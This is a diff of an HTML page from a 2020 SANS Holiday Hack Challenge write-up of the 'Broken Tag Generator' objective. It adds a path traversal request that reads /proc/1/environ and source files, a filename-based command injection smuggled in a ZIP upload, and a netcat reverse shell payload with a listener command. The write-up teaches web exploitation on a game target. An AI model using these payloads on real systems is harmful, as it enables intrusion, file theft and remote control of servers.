@@ -18,7 +18,7 @@
     
     
       
-        <title>Tag Generator - 2020 SANS HHC Write-Up</title>
+        <title>Broken Tag Generator - 2020 SANS HHC Write-Up</title>
       
     
     
@@ -43,8 +43,6 @@
       
     
     
-    
-      <link rel="stylesheet" href="../../css/asciinema-player.css">
     
       <link rel="stylesheet" href="../../css/extra.css">
     
@@ -102,7 +100,7 @@
         <div class="md-header-nav__topic">
           <span class="md-ellipsis">
             
-              Tag Generator
+              Broken Tag Generator
             
           </span>
         </div>
@@ -223,7 +221,7 @@
 
   <li class="md-nav__item">
     <a href="../o1/" class="md-nav__link">
-      Gift List
+      Uncover Santa's Gift List
     </a>
   </li>
 
@@ -236,7 +234,7 @@
 
   <li class="md-nav__item">
     <a href="../o2/" class="md-nav__link">
-      S3 Bucket
+      Investigate S3 Bucket
     </a>
   </li>
 
@@ -249,7 +247,7 @@
 
   <li class="md-nav__item">
     <a href="../o3/" class="md-nav__link">
-      Password Recovery
+      PoS Password Recovery
     </a>
   </li>
 
@@ -262,7 +260,7 @@
 
   <li class="md-nav__item">
     <a href="../o4/" class="md-nav__link">
-      Santavator
+      Operate the Santavator
     </a>
   </li>
 
@@ -275,7 +273,7 @@
 
   <li class="md-nav__item">
     <a href="../o5/" class="md-nav__link">
-      HID Lock
+      Open HID Lock
     </a>
   </li>
 
@@ -288,7 +286,7 @@
 
   <li class="md-nav__item">
     <a href="../o6/" class="md-nav__link">
-      Splunk
+      Splunk Challenge
     </a>
   </li>
 
@@ -301,7 +299,7 @@
 
   <li class="md-nav__item">
     <a href="../o7/" class="md-nav__link">
-      CAN-D-BUS
+      CAN-D-BUS Problem
     </a>
   </li>
 
@@ -322,12 +320,12 @@
     
     
       <label class="md-nav__link md-nav__link--active" for="__toc">
-        Tag Generator
+        Broken Tag Generator
         <span class="md-nav__icon md-icon"></span>
       </label>
     
     <a href="./" class="md-nav__link md-nav__link--active">
-      Tag Generator
+      Broken Tag Generator
     </a>
     
       
@@ -392,7 +390,7 @@
 
   <li class="md-nav__item">
     <a href="../o10/" class="md-nav__link">
-      Fingerprint Sensor
+      Defeat Fingerprint Sensor
     </a>
   </li>
 
@@ -404,7 +402,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../o11/" class="md-nav__link">
+    <a href="../o11a/" class="md-nav__link">
       Naughty/Nice List Pt.1
     </a>
   </li>
@@ -417,7 +415,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../o12/" class="md-nav__link">
+    <a href="../o11b/" class="md-nav__link">
       Naughty/Nice List Pt.2
     </a>
   </li>
@@ -589,7 +587,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../hints/h11/" class="md-nav__link">
+    <a href="../../hints/h11a/" class="md-nav__link">
       Snowball Fight
     </a>
   </li>
@@ -613,6 +611,19 @@
   </li>
 
     
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../map/" class="md-nav__link">
+      ASCII Map
+    </a>
+  </li>
+
+    
   </ul>
 </nav>
                   </div>
@@ -632,44 +643,163 @@
 <strong>Terminal hint</strong>: <a href="../../hints/h8/">Redis Bug Hunt</a></p>
 <h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">⚓︎</a></h2>
 <div class="admonition question">
-<p class="admonition-title">Objective</p>
+<p class="admonition-title">Request</p>
 <p>Help Noel Boetie fix the <a href="https://tag-generator.kringlecastle.com/">Tag Generator</a> in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.</p>
 </div>
-<details class="quote"><summary>Noel Boetie</summary><p>Welcome to the Wrapping Room, Santa!</p>
-<p>The tag generator is acting up.</p>
-<p>I feel like the issue has something to do with weird files being uploaded.</p>
-<p>Can you help me figure out what's wrong?</p>
+<details class="quote"><summary>Noel Boetie</summary><p>Welcome to the Wrapping Room, Santa!<br/>
+The tag generator is acting up.<br/>
+I feel like the issue has something to do with weird files being uploaded.<br/>
+Can you help me figure out what's wrong?<br/></p>
 </details>
 <h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">⚓︎</a></h2>
-<details class="hint"><summary>Patience and Timing - Holly Evergreen</summary><p>Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!</p>
+<details class="hint"><summary>Patience and Timing</summary><p>Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!</p>
 </details>
-<details class="hint"><summary>Source Code Analysis - Holly Evergreen</summary><p>I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark?</p>
+<details class="hint"><summary>Source Code Analysis</summary><p>I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark?</p>
 </details>
-<details class="hint"><summary>Endpoint Exploration - Holly Evergreen</summary><p>Is there an endpoint that will print arbitrary files?</p>
+<details class="hint"><summary>Endpoint Exploration</summary><p>Is there an endpoint that will print arbitrary files?</p>
 </details>
-<details class="hint"><summary>Content-Type Gotcha - Holly Evergreen</summary><p>If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)!</p>
+<details class="hint"><summary>Content-Type Gotcha</summary><p>If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)!</p>
 </details>
-<details class="hint"><summary>Error Page Message Disclosure - Holly Evergreen</summary><p>Can you figure out the path to the script? It's probably on error pages!</p>
+<details class="hint"><summary>Error Page Message Disclosure</summary><p>Can you figure out the path to the script? It's probably on error pages!</p>
 </details>
-<details class="hint"><summary>Download File Mechanism - Holly Evergreen</summary><p>Once you know the path to the file, we need a way to download it!</p>
+<details class="hint"><summary>Download File Mechanism</summary><p>Once you know the path to the file, we need a way to download it!</p>
 </details>
-<details class="hint"><summary>Source Code Retrieval - Holly Evergreen</summary><p>We might be able to find the problem if we can get source code!</p>
+<details class="hint"><summary>Source Code Retrieval</summary><p>We might be able to find the problem if we can get source code!</p>
 </details>
-<details class="hint"><summary>Redirect to Download - Holly Evergreen</summary><p>If you find a way to execute code blindly, I bet you can redirect to a file then download that file!</p>
+<details class="hint"><summary>Redirect to Download</summary><p>If you find a way to execute code blindly, I bet you can redirect to a file then download that file!</p>
 </details>
 <h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
 <div class="admonition note">
 <p class="admonition-title">Quick 'n dirty or reverse shell?</p>
 <p>You can either solve this with minimal effort or you can go for a reverse shell. We'll explore both options! <img alt="😄" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f604.svg" title=":smile:" /></p>
 </div>
+<h3>Path Traversal</h3>
+<p>Start by analyzing the <a href="https://tag-generator.kringlecastle.com/js/app.js"><code>app.js</code></a> JavaScript code. After a successful file upload the uploaded image will be accessible via the <code>/image?id=</code> endpoint with <code>id</code> being a randomly generated value that identifies the image (line 7). </p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="nx">success</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.uploadForm&#39;</span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">reset</span><span class="p">();</span>
+  <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;[for=file-1] span&#39;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="s1">&#39;Select file(s)&#39;</span><span class="p">);</span>
+  <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">data</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">id</span> <span class="p">=&gt;</span> <span class="p">{</span>
+      <span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;&lt;img id=&quot;dynamic&quot;&gt;&#39;</span><span class="p">);</span>
+<span class="hll">      <span class="nx">img</span><span class="p">.</span><span class="nx">attr</span><span class="p">(</span><span class="s1">&#39;src&#39;</span><span class="p">,</span> <span class="sb">`/image?id=</span><span class="si">${</span><span class="nx">id</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span>      <span class="nx">img</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;load&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="kr">const</span> <span class="nx">imgElement</span> <span class="o">=</span> <span class="nx">img</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
+        <span class="kd">var</span> <span class="nx">imgInstance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">fabric</span><span class="p">.</span><span class="nx">Image</span><span class="p">(</span><span class="nx">imgElement</span><span class="p">,</span> <span class="p">{</span>
+          <span class="nx">left</span><span class="o">:</span> <span class="p">(</span><span class="nx">canvas</span><span class="p">.</span><span class="nx">width</span> <span class="o">-</span> <span class="nx">imgElement</span><span class="p">.</span><span class="nx">width</span><span class="p">)</span> <span class="o">/</span> <span class="mf">2</span><span class="p">,</span>
+          <span class="nx">top</span><span class="o">:</span> <span class="p">(</span><span class="nx">canvas</span><span class="p">.</span><span class="nx">height</span> <span class="o">-</span> <span class="nx">imgElement</span><span class="p">.</span><span class="nx">height</span><span class="p">)</span> <span class="o">/</span> <span class="mf">2</span><span class="p">,</span>
+          <span class="nx">angle</span><span class="o">:</span> <span class="mf">0</span><span class="p">,</span>
+          <span class="nx">opacity</span><span class="o">:</span> <span class="mf">1</span>
+        <span class="p">});</span>
+        <span class="nx">canvas</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="nx">imgInstance</span><span class="p">);</span>
+      <span class="p">});</span>
+    <span class="p">});</span>
+  <span class="p">},</span> <span class="mf">500</span><span class="p">);</span>
+<span class="p">},</span>
+</code></pre></div>
+</td></tr></table>
+<h3>Short solution</h3>
+<p>The <code>/image?id=</code> endpoint appears to be vulnerable to a <a href="https://owasp.org/www-community/attacks/Path_Traversal">path traversal attack</a>, allowing us to read files on the remote system. Since the objective is to read the value of an environment variable and pretty much everything on Linux is considered a file, a request to <code>/image?id=../../../proc/1/environ</code> will return the information we need in the HTTP response, including <code>GREETZ</code>. <img alt="😜" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f61c.svg" title=":stuck_out_tongue_winking_eye:" /></p>
+<p><img alt="Short solution" src="../../img/objectives/o8/solution_short.png" /></p>
+<h3>Longer solution</h3>
+<p>An HTTP request using an invalid <code>id</code> will result in a 404 error response with a message stating <code>Error in /app/lib/app.rb: Route not found</code>. This tells us the location of the backend Ruby on Rails source code file.</p>
+<p><img alt="HTTP request error" src="../../img/objectives/o8/raw_response.png" /></p>
+<div class="admonition info">
+<p class="admonition-title">Tricking web browsers using <code>X-Content-Type-Options: nosniff</code></p>
+<p>The <code>X-Content-Type-Options: nosniff</code> header in the HTTP response message prevents web browsers from doing MIME-type sniffing. The web browser will take whatever is set as the <code>Content-Type</code> and assume that information is correct. In this case, the HTTP response tells the browser the data is an <code>image/jpg</code> file which the browser fails to render. As a result, using an invalid <code>id</code> in a web browser will display an image rendering error instead.</p>
+<div class="highlight"><pre><span></span><code>The image “https://tag-generator.kringlecastle.com/image?id=somethingsomething%20test” cannot be displayed because it contains errors.
+</code></pre></div>
+</div>
+<p>We can leverage the same <a href="https://owasp.org/www-community/attacks/Path_Traversal">path traversal attack</a> as before by issuing a request to <code>https://tag-generator.kringlecastle.com/image?id=../../../app/lib/app.rb</code> to download <a href="../../artifacts/objectives/o8/app.rb"><code>app.rb</code></a>. Because the backend code does not filter the <code>filename</code> variable prior to using it in the <code>system</code> call, we can leverage this flaw to execute our own code (line 7).</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">handle_image</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+  <span class="n">out_filename</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">#{</span> <span class="no">SecureRandom</span><span class="o">.</span><span class="n">uuid</span> <span class="si">}#{</span><span class="no">File</span><span class="o">.</span><span class="n">extname</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">downcase</span><span class="si">}</span><span class="s2">&quot;</span>
+  <span class="n">out_path</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">#{</span> <span class="no">FINAL_FOLDER</span> <span class="si">}</span><span class="s2">/</span><span class="si">#{</span> <span class="n">out_filename</span> <span class="si">}</span><span class="s2">&quot;</span>
+
+  <span class="c1"># Resize and compress in the background</span>
+  <span class="no">Thread</span><span class="o">.</span><span class="n">new</span> <span class="k">do</span>
+<span class="hll">    <span class="k">if</span> <span class="o">!</span><span class="nb">system</span><span class="p">(</span><span class="s2">&quot;convert -resize 800x600</span><span class="se">\\</span><span class="s2">&gt; -quality 75 &#39;</span><span class="si">#{</span> <span class="n">filename</span> <span class="si">}</span><span class="s2">&#39; &#39;</span><span class="si">#{</span> <span class="n">out_path</span> <span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">)</span>
+</span>      <span class="no">LOGGER</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&quot;Something went wrong with file conversion: </span><span class="si">#{</span> <span class="n">filename</span> <span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">else</span>
+      <span class="no">LOGGER</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;File successfully converted: </span><span class="si">#{</span> <span class="n">filename</span> <span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+</code></pre></div>
+</td></tr></table>
+<p>Structuring the filename of the uploaded file as <code>myfile';command_to_run;ls '.png</code> will translate the <code>convert</code> command into <code>convert -resize 800x600\\&gt; -quality 75 'myfile';</code>, <code>command_to_run;</code>, and <code>ls '.png' '#{ out_path }'</code>. Nudging our own command neatly in the middle. </p>
+<p>The <code>process_file()</code> function tells us the app allows uploading files with an extension matching either <code>.jpg</code>, <code>.jpeg</code>, <code>.png</code>, or <code>.zip</code>. To prevent our uploaded file from being renamed at the server side we can leverage the <code>handle_zip()</code> function as it leaves filenames as-is after unpacking the uploaded archive (line 7). Luckily for us, Jack also commented out the filename validation code (line 2). Thanks, Jack! <img alt="👍" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f44d.svg" title=":thumbsup:" /></p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="c1"># I wonder what this will do? --Jack</span>
+<span class="hll"><span class="c1"># if entry.name !~ /^[a-zA-Z0-9._-]+$/</span>
+</span><span class="c1">#   raise &#39;Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen&#39;</span>
+<span class="c1"># end</span>
+
+<span class="c1"># We want to extract into TMP_FOLDER</span>
+<span class="hll"><span class="n">out_file</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">#{</span> <span class="no">TMP_FOLDER</span> <span class="si">}</span><span class="s2">/</span><span class="si">#{</span> <span class="n">entry</span><span class="o">.</span><span class="n">name</span> <span class="si">}</span><span class="s2">&quot;</span>
+</span>
+<span class="c1"># Extract to file or directory based on name in the archive</span>
+<span class="n">entry</span><span class="o">.</span><span class="n">extract</span><span class="p">(</span><span class="n">out_file</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1"># If the file exists, simply overwrite</span>
+  <span class="kp">true</span>
+<span class="p">}</span>
+
+<span class="c1"># Process it</span>
+<span class="n">out_files</span> <span class="o">&lt;&lt;</span> <span class="n">process_file</span><span class="p">(</span><span class="n">out_file</span><span class="p">)</span>
+</code></pre></div>
+</td></tr></table>
+<p>To retrieve the value of the <code>GREETZ</code> environment variable, create an image file named <code>myfile';echo $GREETZ&gt;the_GREETZ_tag.txt;ls '.png</code>, add it to a <a href="../../tools/objectives/o8/GREETZ_payload.zip">ZIP file</a>, and upload it using the tag generator application. The application will unpack the archive, execute our command, and save the output to <code>/tmp/the_GREETZ_tag.txt</code> which we can then download using a request to <code>https://tag-generator.kringlecastle.com/image?id=../../../tmp/the_GREETZ_tag.txt</code>. <img alt="💥" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f4a5.svg" title=":boom:" /></p>
+<p><img alt="Longer solution" src="../../img/objectives/o8/solution_long.png" /></p>
 <div class="admonition done">
 <p class="admonition-title">Answer</p>
 <p>JackFrostWasHere</p>
 </div>
-<div class="admonition quote">
-<p class="admonition-title">Noel Boetie</p>
-<p>Yay! You found the flaw!</p>
-<p>We'll work on fixing it.</p>
+<div class="admonition note">
+<p class="admonition-title">Reverse shell</p>
+<p>A request to <code>https://tag-generator.kringlecastle.com/image?id=../../../bin/nc</code> confirms that netcat is available so we can leverage the code execution vulnerability to establish a reverse shell with full interactive access. The command we need to run on the host is <code>nc 1.2.3.4 55100 -e /usr/bin/sh</code>, but forward slashes are not an option as they're not allowed in a file name.</p>
+<p>We can work around this limitation by using <code>`which sh`</code> to ask the system what the full path for the <code>sh</code> binary is, instead of specifying it as part of the filename. The image filename now becomes <code>myfile';nc 1.2.3.4 55100 -e `which sh`;ls '.png</code>. Set up a local listener using <code>nc -nlvp 55100</code>, upload the <a href="../../tools/objectives/o8/reverse_shell_payload.zip">zipped image file</a>, and wait for the reverse shell connection to be established.</p>
+<p><img alt="Reverse shell" src="../../img/objectives/o8/reverse_shell.png" /></p>
 </div>
                 
               
@@ -698,7 +828,7 @@
                 <span class="md-footer-nav__direction">
                   Previous
                 </span>
-                CAN-D-BUS
+                CAN-D-BUS Problem
               </div>
             </div>
           </a>
@@ -779,8 +909,6 @@
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
       
         <script src="../../js/tables.js"></script>
-      
-        <script src="../../js/asciinema-player.js"></script>
       
     
   </body>
